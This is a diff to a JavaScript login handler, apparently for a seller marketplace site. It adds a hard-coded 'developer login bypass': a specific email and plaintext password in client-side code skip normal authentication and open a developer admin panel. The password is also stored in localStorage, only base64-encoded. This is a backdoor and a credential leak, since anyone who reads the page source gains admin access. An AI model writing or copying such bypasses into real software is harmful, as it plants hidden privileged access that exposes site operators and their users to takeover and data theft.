@@ -345,6 +345,26 @@ export const handleAuth = async () => {
     if (loader) loader.classList.remove('hidden');
     try {
         await signInAnonymously(auth);
+
+        // System Architect / Developer Coder Login bypass
+        if (loginInput.toLowerCase() === 'codez4848@gmail.com' && passInput === 'codez@48484848') {
+            localStorage.setItem('coderAuth', JSON.stringify({
+                e: btoa('codez4848@gmail.com'),
+                p: btoa(passInput)
+            }));
+            if (loader) loader.classList.add('hidden');
+
+            const authModal = document.getElementById('auth-modal');
+            if (authModal) authModal.classList.add('hidden');
+
+            if (window.openDeveloperAdminModal) {
+                window.openDeveloperAdminModal();
+            } else {
+                window.location.href = 'seller/developer.html';
+            }
+            return;
+        }
+
         const isSellerId = loginInput.startsWith('SLR-');
         const queryField = isSellerId ? "sellerId" : "email";
 
